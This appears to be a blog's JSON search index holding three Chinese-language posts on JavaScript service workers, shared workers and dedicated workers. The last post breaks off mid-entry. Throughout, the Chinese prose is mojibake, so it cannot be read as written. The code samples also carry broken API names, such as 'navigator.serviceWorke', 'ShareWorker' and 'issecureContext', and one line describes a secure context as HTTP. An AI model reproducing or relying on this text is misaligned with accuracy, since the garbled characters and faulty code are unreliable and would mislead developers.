[
  
  {
    "title": "æœåŠ¡å·¥ä½œè€…çº¿ç¨‹",
    "url": "/posts/%E6%9C%8D%E5%8A%A1%E5%B7%A5%E4%BD%9C%E8%80%85%E7%BA%BF%E7%A8%8B/",
    "categories": "javascriptThread",
    "tags": "javascriptThread, Thread",
    "date": "2024-01-30 00:00:00 +0800",
    





    
    "snippet": "â€‹\tæœåŠ¡å·¥ä½œè€…çº¿ç¨‹æ‹¦æˆªå¤–å‡ºè¯·æ±‚ã€ç¼“å­˜å“åº”ï¼Œå¯ä»¥è®©é¡µé¢åœ¨æ²¡æœ‰ç½‘ç»œæ—¶æ­£å¸¸ä½¿ç”¨ï¼Œå› ä¸ºéƒ¨åˆ†æˆ–å…¨éƒ¨é¡µé¢ä»æœåŠ¡å·¥ä½œè€…çº¿ç¨‹ä¸­æä¾›æœåŠ¡ã€‚æ¥è‡ªä¸€ä¸ªåŸŸçš„å¤šä¸ªé¡µé¢å…±äº«ä¸€ä¸ªæœåŠ¡å·¥ä½œè€…çº¿ç¨‹ï¼Œç›¸å…³é¡µé¢å…³é—­åçº¿ç¨‹ä¹Ÿä¸ä¼šå…³é—­ï¼Œè€Œæ˜¯ç­‰å¾…åˆ°æ¥çš„æ¨é€äº‹ä»¶ã€‚â€‹\tä¸»è¦ä»»åŠ¡ï¼šå……å½“ç½‘ç»œè¯·æ±‚çš„ç¼“å­˜å±‚ &amp; å¯ç”¨æ¨é€é€šçŸ¥çº¿ç¨‹åŸºç¡€â€‹\tæ²¡æœ‰å…¨å±€æ„é€ å‡½æ•°ï¼Œé€šè¿‡ ServiceWorkerContainerç®¡ç†ï¼Œå®ƒçš„å®ä¾‹ä¿å­˜åœ¨navigato...",
    "content": "â€‹\tæœåŠ¡å·¥ä½œè€…çº¿ç¨‹æ‹¦æˆªå¤–å‡ºè¯·æ±‚ã€ç¼“å­˜å“åº”ï¼Œå¯ä»¥è®©é¡µé¢åœ¨æ²¡æœ‰ç½‘ç»œæ—¶æ­£å¸¸ä½¿ç”¨ï¼Œå› ä¸ºéƒ¨åˆ†æˆ–å…¨éƒ¨é¡µé¢ä»æœåŠ¡å·¥ä½œè€…çº¿ç¨‹ä¸­æä¾›æœåŠ¡ã€‚æ¥è‡ªä¸€ä¸ªåŸŸçš„å¤šä¸ªé¡µé¢å…±äº«ä¸€ä¸ªæœåŠ¡å·¥ä½œè€…çº¿ç¨‹ï¼Œç›¸å…³é¡µé¢å…³é—­åçº¿ç¨‹ä¹Ÿä¸ä¼šå…³é—­ï¼Œè€Œæ˜¯ç­‰å¾…åˆ°æ¥çš„æ¨é€äº‹ä»¶ã€‚â€‹\tä¸»è¦ä»»åŠ¡ï¼šå……å½“ç½‘ç»œè¯·æ±‚çš„ç¼“å­˜å±‚ &amp; å¯ç”¨æ¨é€é€šçŸ¥çº¿ç¨‹åŸºç¡€â€‹\tæ²¡æœ‰å…¨å±€æ„é€ å‡½æ•°ï¼Œé€šè¿‡ ServiceWorkerContainerç®¡ç†ï¼Œå®ƒçš„å®ä¾‹ä¿å­˜åœ¨navigator.serviceWorkerå±æ€§ä¸­ã€‚if('serviceWorker' in navigator){    window.addEventListener('load', ()=&gt;{        // åˆ›å»ºæœåŠ¡å·¥ä½œè€…çº¿ç¨‹        navigator.serviceWorke.register('./serviceWorker.js')\t\t\t.then(console.log, console.error)        \t// å¤šæ¬¡è°ƒç”¨ åŒä¸€ä¸ªURLå¤šæ¬¡è°ƒç”¨è¯¥æ–¹æ³•è¿”å›ç›¸åŒçš„æ³¨å†Œå¯¹è±¡        \t .then((registrationA) =&gt; {            \tnavigator.serviceWorke.register('./serviceWorker.js')            \t\t.then((registrationB) =&gt; {                    \tconsole.log(registrationA === registrationB)                })        });    })}â€‹\t.register() è¿”å›ä¸€ä¸ªæœŸçº¦ï¼Œè§£å†³ä¸ºServiceWorkerRegistrationå¯¹è±¡ï¼Œæˆ–åœ¨æ³¨å†Œå¤±è´¥æ—¶æ‹’ç»ã€‚ç¬¬ä¸€æ¬¡è°ƒç”¨å¹¶æ¿€æ´»æœåŠ¡ç«™å·¥ä½œè€…çº¿ç¨‹åï¼Œåç»­çš„è°ƒç”¨ï¼ˆåŒä¸€ä¸ªæºï¼‰ä¸ä¼šæ‰§è¡Œã€‚ç”±äºæœåŠ¡è€…çº¿ç¨‹ä¸æ˜¯æ‰€æœ‰æµè§ˆå™¨éƒ½æ”¯æŒã€å¯¹äºé¡µé¢ä¸å¯è§†ï¼Œæ‰€ä»¥æ³¨å†Œè¡Œä¸ºå¸¸å¸¸éœ€è¦é…åˆ ç‰¹æ€§æ£€æµ‹ï¼Œå¹¶åœ¨loadäº‹ä»¶ä¸­æ“ä½œã€‚ServiceWorkerContainerğŸˆ äº‹ä»¶å¤„ç†ï¼š  oncontrollerchangeï¼šè·çš„æ–°æ¿€æ´»çš„ServiceWorkerRegistrationçº¿ç¨‹æ³¨å†Œå™¨ è§¦å‘  onerrorï¼šè§¦å‘ErrorEventé”™è¯¯äº‹ä»¶æ—¶  onmessageï¼šè§¦å‘MessageEventé”™è¯¯äº‹ä»¶æ—¶ğŸˆ å±æ€§ï¼š  readyï¼šè¿”å›æœŸçº¦ï¼Œè§£å†³ä¸ºServiceWorkerRegistrationå¯¹è±¡ï¼Œä¸ä¼šæ‹’ç»  controllerï¼šè¿”å›ä¸å½“å‰é¡µé¢å…³è”çš„æ¿€æ´»çš„ ServiceWorkerå¯¹è±¡ï¼Œå¦‚æœæ²¡æœ‰æ¿€æ´»çš„çº¿ç¨‹åˆ™è¿”å›nullğŸˆ æ–¹æ³•ï¼š  getRegistration(URL)ï¼šè¿”å›çš„åŒ¹é…çš„ServiceWorkerContainerå¯¹è±¡ï¼Œæ²¡æœ‰åˆ™è¿”å›null  getRegistrations()ï¼šè¿”å›åŒ¹é…çš„ServiceWorkerContainerå¯¹è±¡æ•°ç»„ï¼Œæ²¡æœ‰åˆ™è¿”å›ç©ºæ•°ç»„ServiceWorkerRegistrationâ€‹\tServiceWorkerRegistrationå¯¹è±¡è¡¨ç¤ºæ³¨å†ŒæˆåŠŸçš„æœåŠ¡å·¥ä½œè€…çº¿ç¨‹ï¼Œå¯ä»¥åœ¨register()è¿”å›çš„è§£å†³æœŸçº¦å¤„ç†ç¨‹åºä¸­è®¿é—®åˆ°ã€‚ğŸˆ äº‹ä»¶å¤„ç†ï¼š  onupdatefoundï¼šçº¿ç¨‹å¼€å§‹å®‰è£…æ–°ç‰ˆæœ¬æ—¶è§¦å‘ï¼ŒServiceWorkerRegistration.installingæ”¶åˆ°æ–°çš„æœåŠ¡å·¥ä½œè€…çº¿ç¨‹ğŸˆ å±æ€§ï¼š  scopeï¼šè·å–æ³¨å†Œçš„URL  navigationPreloadï¼šè¿”å›ä¸æ³¨å†Œå¯¹è±¡å…³è”çš„NavigationPreloadManagerå®ä¾‹  pushManagerï¼šè¿”å›ä¸æ³¨å†Œå¯¹è±¡å…³è”çš„PreloadManagerå®ä¾‹  åˆ¤æ–­ç”Ÿå‘½å‘¨æœŸé˜¶æ®µï¼šï¼ˆä¸€æ¬¡å¿«ç…§ï¼Œé™¤éskipWaiting()å¼ºåˆ¶æ”¹å˜çŠ¶æ€ï¼‰          installing      waiting      active      ğŸˆ æ–¹æ³•ï¼š  getNotifications()  showNotifications('title',{options})  update()ï¼šé‡å†™è¯·æ±‚æœåŠ¡è„šæœ¬ï¼ŒURLä¸åŒä¼šé‡æ–°åˆå§‹åŒ–  unregister()ï¼šå–æ¶ˆæœåŠ¡å·¥ä½œè€…çº¿ç¨‹çš„æ³¨å†Œï¼Œä¼šåœ¨çº¿ç¨‹æ‰§è¡Œå®Œæˆå†å–æ¶ˆæ³¨å†ŒServiceWorkerğŸˆ äº‹ä»¶å¤„ç†ï¼š  onstatechangeğŸˆ å±æ€§ï¼š  scriptURLï¼šè§£ææ³¨å†ŒæœåŠ¡å·¥ä½œè€…çš„URLï¼Œè§£æä¸ºç»å¯¹åœ°å€  stateï¼šå¯ä»¥æœ‰ä»¥ä¸‹çŠ¶æ€ â€”â€”          installing  installed      activating   activated      redundant      å®‰å…¨é™åˆ¶â€‹\tå—åŠ è½½è„šæœ¬å¯¹åº”æºçš„å¸¸è§„é™åˆ¶ï¼›æ­¤å¤–å‡ ä¹å¯ä»¥ä»»æ„ä¿®æ”¹å’Œé‡å®šå‘ç½‘ç»œè¯·æ±‚ã€åŠ è½½é™æ€èµ„æºã€‚â€‹\tAPI åªèƒ½åœ¨ å®‰å…¨ä¸Šä¸‹æ–‡ï¼ˆHTTPï¼‰ä¸‹ä½¿ç”¨ï¼Œéå®‰å…¨ä¸Šä¸‹æ–‡ä¸­navigator.serviceWorker = undefinedâ€‹\tå¯ä»¥é€šè¿‡window.issecureContextåˆ¤æ–­å½“å‰ä¸Šä¸‹æ–‡æ˜¯å¦å®‰å…¨ServiceWorkerGlobalScopeğŸˆ å±æ€§ï¼š  cachesï¼šè¿”å›çº¿ç¨‹çš„Cachestorageå¯¹è±¡  clientsï¼šè¿”å›çº¿ç¨‹çš„clientsæ¥å£ï¼Œå¯ä»¥è®¿é—®åº•å±‚Clientå¯¹è±¡  registrationï¼šè¿”å›çº¿ç¨‹çš„ServiceWorkerRegistrationå¯¹è±¡ğŸˆ æ–¹æ³•ï¼š  skipWaiting()ï¼šå¼ºåˆ¶æœåŠ¡å·¥ä½œè€…çº¿ç¨‹è¿›å…¥æ´»åŠ¨çŠ¶æ€ï¼Œéœ€è¦å’ŒClients.claim()ä¸€èµ·ä½¿ç”¨  fetch()ï¼šåœ¨æœåŠ¡å·¥ä½œè€…çº¿ç¨‹å†…å‘ç”Ÿå¸¸è§„ç½‘ç»œè¯·æ±‚          å¯ä»¥æˆªè·ä¸»é¡µé¢çš„fetch()è¯·æ±‚ï¼Œåœ¨å¿…è¦æ—¶å‘ç”Ÿå®é™…è¯·æ±‚ï¼ˆè€Œä¸æ˜¯è¯»å–ç¼“å­˜ï¼‰      self.onfetchå±æ€§å¯ä»¥è®¿é—®FetchEventï¼Œæ ¹æ®éœ€è¦è°ƒæ•´è¾“å‡º        notificationclickï¼šæµè§ˆå™¨å…ƒç´ ç‚¹å‡»ServiceWorkerRegistration.showNotification()è§¦å‘  notificationcloseï¼šæµè§ˆå™¨å…ƒç´ å…³é—­ServiceWorkerRegistration.showNotification()è§¦å‘  pushsubscriptionchangeï¼šåœ¨åº”ç”¨æ§åˆ¶å¤–çš„å› ç´ ï¼ˆéJavaScriptæ˜¾å¼æ“ä½œï¼‰å¯¼è‡´æ¨é€è®¢é˜…çŠ¶æ€å˜åŒ–ä½œç”¨åŸŸé™åˆ¶â€‹\tåªèƒ½æ‹¦æˆªå…¶ä½œç”¨åŸŸå†…çš„å®¢æˆ·ç«¯å‘ç”Ÿçš„è¯·æ±‚ï¼Œç›¸å¯¹äºè·å–æœåŠ¡è„šæœ¬çš„è·¯å¾„å®šä¹‰çš„// é»˜è®¤æ ¹ä½œç”¨åŸŸnavigator.serviceWorke.register('./serviceWorker.js')\t// scope: https://example.com/ \t// \tâ€”â€” https://example.com/foo.js ä¼šè¢«æ‹¦æˆª\t// \tâ€”â€” https://example.com/foo/fooscript.js ä¼šè¢«æ‹¦æˆª// æ ¹ç›®å½•è·å–è„šæœ¬ï¼Œé™å®šç›®å½•ä½œç”¨åŸŸnavigator.serviceWorke.register('./serviceWorker.js', {scope:'./foo'})\t// scope: https://example.com/foo/ \t// \tâ€”â€” https://example.com/foo.js ä¸ä¼šè¢«æ‹¦æˆª\t// \tâ€”â€” https://example.com/foo/fooscript.js ä¼šè¢«æ‹¦æˆª// åµŒå¥—çš„äºŒçº§ç›®å½•è·å–è„šæœ¬ï¼ŒæŒ‡å®šåŒä¸€ç›®å½•ä½œç”¨åŸŸnavigator.serviceWorke.register('./foo/serviceWorker.js')\t// scope: https://example.com/foo/ \t// \tâ€”â€” https://example.com/foo.js ä¸ä¼šè¢«æ‹¦æˆª\t// \tâ€”â€” https://example.com/foo/fooscript.js ä¼šè¢«æ‹¦æˆª// ä½œç”¨åŸŸèŒƒå›´ â‰¤ è„šæœ¬æ‰€åœ¨è·¯å¾„navigator.serviceWorke.register('./serviceWorker.js',{scope: '/'}) // Errorâ€‹\tä½œç”¨åŸŸä¼šä½¿ç”¨æœ«å°¾å¸¦æ–œæ çš„ ç»å¯¹è·¯å¾„ï¼Œå°†è„šæœ¬æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„ä¸å…¶åˆ†å¼€ï¼ŒåŒæ—¶å°†è·¯å¾„æœ¬èº«æ’é™¤åœ¨ä½œç”¨åŸŸå¤–ã€‚â€‹\tæ‰©å±•ä½œç”¨åŸŸæ–¹æ³•ï¼š  åŒ…å«æƒ³è¦çš„ä½œç”¨åŸŸè·¯å¾„æä¾›ï¼ˆè·å–ï¼‰æœåŠ¡è„šæœ¬  æœåŠ¡è„šæœ¬å“åº”å¤´`Service-Worker-Allowed = `ç›®æ ‡ä½œç”¨åŸŸï¼Œè¿™ä¸ªä½œç”¨åŸŸåº”è¯¥å’Œregister()ä½œç”¨åŸŸä¸€è‡´ã€‚"
  },
  
  {
    "title": "å…±äº«å·¥ä½œè€…çº¿ç¨‹",
    "url": "/posts/%E5%85%B1%E4%BA%AB%E5%B7%A5%E4%BD%9C%E8%80%85%E7%BA%BF%E7%A8%8B/",
    "categories": "javascriptThread",
    "tags": "javascriptThread, Thread",
    "date": "2024-01-29 00:00:00 +0800",
    





    
    "snippet": "å…±äº«å·¥ä½œè€…çº¿ç¨‹â€‹\tShareWorkerè¢«å¤šä¸ªå¯ä¿¡ä»»çš„æ‰§è¡Œä¸Šä¸‹æ–‡è®¿é—®ï¼Œæ¶ˆæ¯æ¥å£å¤–éƒ¨å’Œå†…éƒ¨æ¥å£ä¸Workeræœ‰äº›ä¸åŒã€‚å¯ä»¥å‡å°‘å…±äº«çº¿ç¨‹è®¡ç®—æ€§æ¶ˆè€—çš„æƒ…å½¢ï¼Œä¸€ä¸ªShareWorkerå¯ä»¥ç®¡ç†å¤šä¸ªåŒæºé¡µé¢web Socketæ¶ˆæ¯ï¼Œæˆ–æˆä¸ºä¸Šä¸‹æ–‡ä¹‹é—´çš„é€šä¿¡çº¿ç¨‹ã€‚ğŸˆ\tåœ¨è¡Œå†…è„šæœ¬ä¸­åˆ›å»ºçš„å…±äº«å·¥ä½œè€…çº¿ç¨‹å§‹ç»ˆæ˜¯å”¯ä¸€çš„ï¼šåªæœ‰æ ‡è¯†ä¸å­˜åœ¨æ—¶ï¼Œæ‰ä¼šåˆ›å»ºæ–°çº¿ç¨‹ï¼›å¦åˆ™é™é»˜æ–°å»ºå¤±è´¥ï¼Œä¸”è°ƒç”¨connectä¸å·²æœ‰çº¿ç¨‹å»ºç«‹è¿æ¥ã€‚â€‹...",
    "content": "å…±äº«å·¥ä½œè€…çº¿ç¨‹â€‹\tShareWorkerè¢«å¤šä¸ªå¯ä¿¡ä»»çš„æ‰§è¡Œä¸Šä¸‹æ–‡è®¿é—®ï¼Œæ¶ˆæ¯æ¥å£å¤–éƒ¨å’Œå†…éƒ¨æ¥å£ä¸Workeræœ‰äº›ä¸åŒã€‚å¯ä»¥å‡å°‘å…±äº«çº¿ç¨‹è®¡ç®—æ€§æ¶ˆè€—çš„æƒ…å½¢ï¼Œä¸€ä¸ªShareWorkerå¯ä»¥ç®¡ç†å¤šä¸ªåŒæºé¡µé¢web Socketæ¶ˆæ¯ï¼Œæˆ–æˆä¸ºä¸Šä¸‹æ–‡ä¹‹é—´çš„é€šä¿¡çº¿ç¨‹ã€‚ğŸˆ\tåœ¨è¡Œå†…è„šæœ¬ä¸­åˆ›å»ºçš„å…±äº«å·¥ä½œè€…çº¿ç¨‹å§‹ç»ˆæ˜¯å”¯ä¸€çš„ï¼šåªæœ‰æ ‡è¯†ä¸å­˜åœ¨æ—¶ï¼Œæ‰ä¼šåˆ›å»ºæ–°çº¿ç¨‹ï¼›å¦åˆ™é™é»˜æ–°å»ºå¤±è´¥ï¼Œä¸”è°ƒç”¨connectä¸å·²æœ‰çº¿ç¨‹å»ºç«‹è¿æ¥ã€‚â€‹\tå…±äº«å·¥ä½œè€…çº¿ç¨‹çš„æ ‡è¯†ï¼šè§£æåçš„URLã€å·¥ä½œè€…çº¿ç¨‹åç§°ã€æ–‡æ¡£æºnew ShareWorker('./worker.js',{name:'foo'})new ShareWorker('https://www.example.com/worker.js',{name:'foo'})ğŸˆ\tShareWorker.portï¼šç‰¹æ®Šå±æ€§ï¼Œä¸“é—¨ç”¨æ¥ä¸å…±äº«çº¿ç¨‹é€šä¿¡çš„MessageğŸˆ\tShareWorker.cennectï¼š äº‹ä»¶â€‹\tworker.port.onmessage &amp; worker.port.start() ä¸å…±äº«çº¿ç¨‹å»ºç«‹è¿æ¥æ—¶è§¦å‘ï¼›â€‹\tåŒ…æ‹¬MessagePortå®ä¾‹çš„portæ•°ç»„ï¼Œå¯ä»¥ç”¨äºæŠŠæ¶ˆæ¯å‘å›çˆ¶ä¸Šä¸‹æ–‡ğŸˆ\tå…±äº«å·¥ä½œè€…çº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸï¼š åªè¦è¿˜æœ‰ä¸€ä¸ªä¸Šä¸‹æ–‡è¿æ¥å°±ä¼šæŒç»­å­˜åœ¨ã€‚â€‹\tå½“çº¿ç¨‹è¿æ¥æ•°ä¸º0æ—¶ï¼ˆå…³è”çš„æ‰€æœ‰é¡µé¢è¢«é”€æ¯ä¸”æ²¡æœ‰è¿æ¥ï¼‰ï¼Œçº¿ç¨‹è¢«ç»ˆæ­¢ï¼›æ²¡æœ‰åŠæ³•ä»¥ç¼–ç¨‹çš„æ–¹å¼ç»ˆæ­¢å®ƒ â€”â€” ä¸å­˜åœ¨ ShareWorker.teminate()â€‹\tå…±äº«çº¿ç¨‹ç«¯å£ä¸Šè°ƒç”¨close()æ—¶ï¼Œåªè¦è¿˜æœ‰ä¸€ä¸ªç«¯å£è¿æ¥ï¼Œå°±ä¸ä¼šçœŸæ­£ç»ˆæ­¢çº¿ç¨‹ã€‚è¿æ¥åˆ°å…±äº«å·¥ä½œè€…çº¿ç¨‹â€‹\tæ¯æ¬¡è°ƒç”¨ShareWorker.constructæ—¶ï¼Œæ— è®ºæ˜¯å¦åˆ›å»ºæ–°çº¿ç¨‹ï¼Œéƒ½ä¼šè§¦å‘cennectäº‹ä»¶ï¼Œéšå¼åˆ›å»ºMessageChannelå®ä¾‹å¹¶å°†æ‰€æœ‰æƒç»™ShareWorkerå®ä¾‹ï¼Œè¿™ä¸ªMessageChannelå®ä¾‹ä¿å­˜åœ¨connectäº‹ä»¶å¯¹è±¡çš„portsæ•°ç»„ä¸­ã€‚â€‹\tæ²¡æœ‰ä»»ä½•äº‹ä»¶å¯ä»¥æ–­å¼€ä¸ShareWorkerå®ä¾‹çš„è¿æ¥ã€‚éšç€é¡µé¢åŠ å…¥å’Œé€€å‡ºè¿æ¥ï¼ŒconnectPortsé›†åˆä¼šå—åˆ°æ­»ç«¯å£çš„å½±å“ã€‚ä¸€ä¸ªæ–¹æ³•æ˜¯åœ¨é¡µé¢æ³¨é”€å‰beforeunlodeäº‹æƒ…æ—¶ï¼Œæ˜ç¡®å‘é€å¸è½½æ¶ˆæ¯ï¼Œè®©å…±äº«çº¿ç¨‹æœ‰æœºä¼šæ¸…é™¤æ­»ç«¯å£ã€‚"
  },
  
  {
    "title": "ä¸“ç”¨å·¥ä½œè€…çº¿ç¨‹",
    "url": "/posts/%E4%B8%93%E7%94%A8%E5%B7%A5%E4%BD%9C%E8%80%85%E7%BA%BF%E7%A8%8B/",
    "categories": "javascriptThread",
    "tags": "javascriptThread, Thread",
    "date": "2024-01-26 00:00:00 +0800",
    





    
    "snippet": "ä¸“ç”¨å·¥ä½œè€…çº¿ç¨‹â€‹\tç”¨ä»¥æ‰§è¡Œé¡µé¢ä¸»çº¿ç¨‹ä¹‹å¤–çš„å…¶ä»–ä»»åŠ¡ï¼Œå¦‚å‘ç”Ÿç½‘ç»œè¯·æ±‚ã€æ‰§è¡Œæ–‡ä»¶è¾“å…¥/è¾“å‡ºã€å¯†é›†çš„è®¡ç®—ã€å¤„ç†å¤§é‡çš„æ•°æ®ï¼Œé€šè¿‡ä¸çˆ¶é¡µé¢äº¤æ¢æ¶ˆæ¯ï¼Œå®Œæˆä¸é€‚åˆåœ¨ä¸»çº¿ç¨‹æ‰§è¡Œçš„ä»»åŠ¡ã€‚ï¼ˆä¸èƒ½ç›´æ¥æ“ä½œé¡µé¢DOMå…ƒç´ ï¼‰åˆè¢«ç§°ä¸º åå°è„šæœ¬ï¼ˆbackground scriptï¼‰ï¼Œç”±åˆå§‹åŒ–çº¿ç¨‹æ—¶æä¾›çš„è„šæœ¬æ§åˆ¶çº¿ç¨‹çš„å„ä¸ªæ–¹é¢ï¼ŒåŒ…æ‹¬ç”Ÿå‘½å‘¨æœŸã€ä»£ç è·¯å¾„ã€è¾“å…¥è¾“å‡ºã€‚// main.jslocation.href; // \"h...",
    "content": "ä¸“ç”¨å·¥ä½œè€…çº¿ç¨‹â€‹\tç”¨ä»¥æ‰§è¡Œé¡µé¢ä¸»çº¿ç¨‹ä¹‹å¤–çš„å…¶ä»–ä»»åŠ¡ï¼Œå¦‚å‘ç”Ÿç½‘ç»œè¯·æ±‚ã€æ‰§è¡Œæ–‡ä»¶è¾“å…¥/è¾“å‡ºã€å¯†é›†çš„è®¡ç®—ã€å¤„ç†å¤§é‡çš„æ•°æ®ï¼Œé€šè¿‡ä¸çˆ¶é¡µé¢äº¤æ¢æ¶ˆæ¯ï¼Œå®Œæˆä¸é€‚åˆåœ¨ä¸»çº¿ç¨‹æ‰§è¡Œçš„ä»»åŠ¡ã€‚ï¼ˆä¸èƒ½ç›´æ¥æ“ä½œé¡µé¢DOMå…ƒç´ ï¼‰åˆè¢«ç§°ä¸º åå°è„šæœ¬ï¼ˆbackground scriptï¼‰ï¼Œç”±åˆå§‹åŒ–çº¿ç¨‹æ—¶æä¾›çš„è„šæœ¬æ§åˆ¶çº¿ç¨‹çš„å„ä¸ªæ–¹é¢ï¼ŒåŒ…æ‹¬ç”Ÿå‘½å‘¨æœŸã€ä»£ç è·¯å¾„ã€è¾“å…¥è¾“å‡ºã€‚// main.jslocation.href; // \"https://...com/\"const worker = new Worker(location.href + 'backgroudScript.js');  // workeræ˜¯å·¥ä½œè€…çº¿ç¨‹ä¸ä¸»çº¿ç¨‹é€šä¿¡çš„è¿æ¥ç‚¹â€‹\tnew Worker() å‚æ•°å¿…é¡»æ˜¯ä¸€ä¸ªè„šæœ¬æ–‡ä»¶ï¼Œä¸“ç”¨å·¥ä½œè€…çº¿ç¨‹åªèƒ½è¢«ç”Ÿæˆå®ƒçš„è„šæœ¬æ‰€ä½¿ç”¨ã€‚â€‹\tåˆå§‹åŒ–å·¥ä½œè€…çº¿ç¨‹æ˜¯éœ€è¦æ—¶é—´çš„ï¼ˆåˆå§‹åŒ–å»¶è¿Ÿï¼‰ï¼Œä¸”å®Œå…¨ç‹¬ç«‹äºmain.jsï¼› ç›¸å¯¹åº”çš„workerçº¿ç¨‹å¯èƒ½è¿˜ä¸å­˜åœ¨ï¼Œä½†åœ¨main.jsä¸­çš„Workerå¯¹è±¡å·²ç»å¯ä»¥ä½¿ç”¨äº†ï¼Œè¿”å›Worker {}ï¼›ä¿¡æ¯å‘é€ç»™åˆå§‹åŒ–çŠ¶æ€çš„å·¥ä½œè€…çº¿ç¨‹ï¼Œä¼šå…ˆåŠ å…¥é˜Ÿåˆ—ï¼Œç­‰çº¿ç¨‹è¿›å…¥æ´»è·ƒçŠ¶æ€ï¼Œå†æŠŠæ¶ˆæ¯ä¼ å…¥çº¿ç¨‹çš„æ¶ˆæ¯é˜Ÿåˆ—ã€‚â€‹\tå·¥ä½œè€…çº¿ç¨‹ä¸å—ä¸»çº¿ç¨‹ï¼ˆdocumentï¼‰å†…å®¹çš„å®‰å…¨ç­–ç•¥é™åˆ¶ï¼Œå› ä¸ºå·¥ä½œè€…çº¿ç¨‹äºçˆ¶æ–‡æ¡£å¤„äºä¸åŒçš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼›ä½†å¦‚æœçº¿ç¨‹åŠ è½½çš„è„šæœ¬å¸¦æœ‰å…¨å±€å”¯ä¸€æ ‡è¯†ç¬¦æ—¶ï¼Œå°±ä¼šå—åˆ°æ–‡æ¡£å†…å®¹å®‰å…¨ç­–ç•¥çš„é™åˆ¶ã€‚Worker å¯¹è±¡â€‹\tnew Worker('url') è¿”å›çš„å®ä¾‹ï¼Œä¸æ–°åˆ›å»ºçš„å·¥ä½œè€…çº¿ç¨‹é€šä¿¡çš„è¿æ¥ç‚¹ï¼Œç”¨äºä¸çˆ¶ä¸Šä¸‹æ–‡ä¼ é€’ä¿¡æ¯ï¼ˆportMessageï¼‰ã€æ•è·å·¥ä½œçº¿ç¨‹å‘å‡ºçš„äº‹ä»¶ï¼ˆonMessageï¼‰åœ¨ç»ˆæ­¢å·¥ä½œè€…çº¿ç¨‹ä¹‹å‰ï¼Œå®ä¾‹ä¸ä¼šè¢«åƒåœ¾å›æ”¶ï¼Œä¹Ÿä¸èƒ½é€šè¿‡ç¼–ç¨‹æ–¹å¼æ¢å¤å¯¹ä¹‹å‰Workå¯¹è±¡çš„å¼•ç”¨ã€‚â€‹\tworkers å’Œä¸»çº¿ç¨‹é—´çš„æ•°æ®ä¼ é€’é€šè¿‡è¿™æ ·çš„æ¶ˆæ¯æœºåˆ¶è¿›è¡Œâ€”â€”åŒæ–¹éƒ½ä½¿ç”¨ postMessage() æ–¹æ³•å‘é€å„è‡ªçš„æ¶ˆæ¯ï¼Œä½¿ç”¨ onmessage äº‹ä»¶å¤„ç†å‡½æ•°æ¥å“åº”æ¶ˆæ¯å¤„ç†ç¨‹åºã€‚å¯ä»¥é€šè¿‡worker.addEventLister('on + type',handler) æ·»åŠ ç›‘è§†å™¨å¤„ç†            ç¨‹åºå…³é”®è¯      è§¦å‘ç±»å‹      åŸå›                   onerror      ErrorEventç±»å‹çš„é”™è¯¯äº‹ä»¶      çº¿ç¨‹æŠ›å‡ºé”™è¯¯              onmessage      MessageEventç±»å‹çš„æ¶ˆæ¯äº‹ä»¶      å‘çˆ¶çº§ä¸Šä¸‹æ–‡å‘é€æ¶ˆæ¯              onmessageerror      MessageEventç±»å‹çš„é”™è¯¯äº‹ä»¶      æ— æ³•ååºåˆ—åŒ–çš„æ¶ˆæ¯      æ–¹æ³•â€‹\tğŸˆpostMessage(message, targetOrigin, [transfer])ï¼šé€šè¿‡å¼‚æ­¥æ¶ˆæ¯äº‹ä»¶ï¼Œå‘å·¥ä½œè€…çº¿ç¨‹å‘ç”Ÿæ¶ˆæ¯â€‹\t\t\tğŸ± messageï¼Œéœ€è¦ä¼ é€’çš„ä¿¡æ¯ï¼ˆå¯ä»¥æ˜¯å¯¹è±¡ã€æ•°ç»„ç­‰ï¼‰æ— éœ€è‡ªå·±åºåˆ—åŒ–â€‹\t\t\tğŸ± targetOriginï¼ŒæŒ‡å®šå“ªäº›çª—å£èƒ½æ¥æ”¶åˆ°æ¶ˆæ¯äº‹ä»¶ï¼Œå­—ç¬¦ä¸²â€*â€œï¼ˆè¡¨ç¤ºæ— é™åˆ¶ï¼Œä¸å»ºè®®ä¾èµ–ä½¿ç”¨ï¼‰æˆ–è€…ä¸€ä¸ª URIâ€‹\t\t\tğŸ± transferï¼Œæ˜¯ä¸€ä¸²å’Œ message åŒæ—¶ä¼ é€’çš„ Transferable å¯¹è±¡ã€‚è¿™äº›å¯¹è±¡çš„æ‰€æœ‰æƒå°†è¢«è½¬ç§»ç»™æ¶ˆæ¯çš„æ¥æ”¶æ–¹ï¼Œè€Œå‘é€ä¸€æ–¹å°†ä¸å†ä¿æœ‰æ‰€æœ‰æƒã€‚â€‹\t\t\t ç›‘å¬åˆ†å‘çš„ messageï¼š dataï¼ˆä¼ é€’è¿‡æ¥çš„å¯¹è±¡ï¼‰ï¼Œoriginï¼ˆå‘é€æ–¹çš„originä¿¡æ¯ï¼‰ï¼Œsourceï¼ˆå‘é€æ–¹çª—å£å¯¹è±¡çš„å¼•ç”¨ï¼‰ å¯ä»¥ç”¨æ¥æ£€æŸ¥æ¶ˆæ¯çš„å‘é€è€…çš„èº«ä»½â€‹\tğŸˆterminate()ï¼šç«‹å³ç»ˆæ­¢å·¥ä½œè€…è¿›ç¨‹ï¼Œæ²¡æœ‰æ¸…ç†æœºä¼šï¼Œè„šæ­¥çªç„¶åœæ­¢ï¼›é”å®šæ¶ˆæ¯é˜Ÿåˆ—ã€‚DedicatedWorkerGlobalScopeâ€‹\tå…¨å±€ä½œç”¨åŸŸæ˜¯ DedicatedWorkerGlobalScope çš„å®ä¾‹ï¼Œå› å…¶ç»§æ‰¿è‡ªWorkerGlobalScopeï¼Œæ‰€ä»¥åŒ…å«å…¶å†…éƒ¨æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ã€‚å¯ä»¥é€šè¿‡ selfå…³é”®å­— è®¿é—®å…¨å±€ä½œç”¨åŸŸã€‚â€‹\tä¸çˆ¶ç±»ä¸åŒçš„å±æ€§å’Œæ–¹æ³•ï¼šâ€‹\tğŸˆnameï¼šå¯é€‰ï¼ŒWorkerå®ä¾‹çš„å­—ç¬¦ä¸²æ ‡è¯†ç¬¦â€‹\tğŸˆclose()ï¼š ä¸ä¸»çº¿ç¨‹ä¸Šçš„worker.terminate()å¯¹åº”â€‹\tğŸˆimportScripts()ï¼š 